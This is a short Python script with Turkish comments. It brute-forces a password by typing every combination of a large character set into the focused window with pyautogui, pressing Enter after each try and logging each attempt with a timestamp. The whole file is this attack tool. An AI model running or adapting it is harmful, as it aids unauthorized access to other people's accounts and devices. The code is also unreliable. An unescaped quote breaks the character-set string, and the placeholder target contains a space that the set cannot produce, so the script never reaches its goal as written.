import itertools
import time
from datetime import datetime
import pyautogui

characters = "abcçdefgğıhıijklmnoöprsştüvyzABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZ0123456789@#$%^&*()-_=+[]{};:'",.<>/?|"
time.sleep(5)

with open("log.txt", "w") as f:
    for password_length in range(1, 64):
        combinations = itertools.product(characters, repeat=password_length)

        for i in combinations:
            password = "".join(i)
            pyautogui.write(password)
            print("Denenen şifre: " + password)
            
            now = datetime.now()
            saat = now.hour
            dakika = now.minute
            saniye = now.second
            salise = now.microsecond // 1000
            timestamp = f"{saat:02}:{dakika:02}:{saniye:02}:{salise:03}"
            print("zaman: " + timestamp)

            f.write(f"Şifre: {password} - Zaman: {timestamp}\n")

            pyautogui.press("enter")
            time.sleep(0.001)
            pyautogui.press("enter")
            time.sleep(0.002)

            if password == "hedefli şifre":
                print("Şifre bulundu: " + password)
                break
        else:
            continue  # İç döngü tamamlandı ama şifre bulunamadı, dışarıya çıkma
        break  # Şifre bulundu, programı sonlandırma
